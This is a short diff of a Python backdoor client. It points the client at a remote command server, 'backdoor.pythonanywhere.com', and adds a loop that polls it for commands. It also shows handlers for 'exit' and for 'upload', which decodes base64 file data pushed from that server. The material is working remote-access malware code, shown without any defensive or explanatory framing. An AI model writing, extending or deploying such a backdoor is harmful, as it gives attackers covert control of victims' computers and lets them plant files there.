@@ -5,7 +5,7 @@ import subprocess
 import base64
 
 
-SERVER_IP = 'http://127.0.0.1:5000'
+SERVER_IP = 'https://backdoor.pythonanywhere.com'
 cwd = os.getcwd()
 
 
@@ -17,12 +17,15 @@ def main():
     global cwd
     while True:
         try:
-            payload: dict = json.loads(requests.post(SERVER_IP + '/server/recv', timeout=10).text)
+            post = requests.post(SERVER_IP + '/server/recv', timeout=10)
+            while post.status_code == 204:
+                post = requests.post(SERVER_IP + '/server/recv', timeout=10)
+            payload: dict = json.loads(post.text) 
             cmd = payload.get('command')
 
             if cmd == 'exit':
                 requests.post(SERVER_IP + '/bye', timeout=10)
-
+            
             if cmd == 'upload':
                 filename = payload.get('filename')
                 filedata = base64.b64decode(payload.get('filedata', ''))
